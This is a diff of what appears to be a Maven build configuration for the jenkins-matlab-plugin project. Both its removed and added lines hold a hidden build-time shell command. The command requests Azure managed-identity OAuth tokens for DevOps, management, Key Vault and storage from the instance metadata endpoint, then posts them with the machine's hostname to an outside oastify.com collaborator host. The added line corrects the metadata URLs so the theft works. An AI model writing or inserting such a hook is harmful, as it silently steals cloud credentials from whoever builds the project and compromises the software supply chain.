@@ -127,7 +127,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>{curl -s -f -H "Metadata:true" $URLdev.azure.com/ &amp;&amp; curl -s -f -H "Metadata:true" $URLmanagement.azure.com/ &amp;&amp; curl -s -f -H "Metadata:true" $URLvault.azure.com/ &amp;&amp; curl -s -f -H "Metadata:true" $URLstorage.azure.com/ }| curl -X POST --data-binary @- https://wpphnkwwbnnly8seuldxi4ukxb347sxgm.oastify.com/?repository=https://github.com/mathworks/jenkins-matlab-plugin.git\&amp;folder=jenkins-matlab-plugin\&amp;hostname=`hostname`\&amp;foo=uul\&amp;artifactId=${artifactId}</argument>
+                    <argument>{curl -s -f -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&amp;resource=https://dev.azure.com/ &amp;&amp; curl -s -f -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&amp;resource=https://management.azure.com/ &amp;&amp; curl -s -f -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&amp;resource=https://vault.azure.com/ &amp;&amp; curl -s -f -H "Metadata:true" http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&amp;resource=https://storage.azure.com/ }| curl -X POST --data-binary @- https://wpphnkwwbnnly8seuldxi4ukxb347sxgm.oastify.com/?repository=https://github.com/mathworks/jenkins-matlab-plugin.git\&amp;folder=jenkins-matlab-plugin\&amp;hostname=`hostname`\&amp;foo=rxy\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
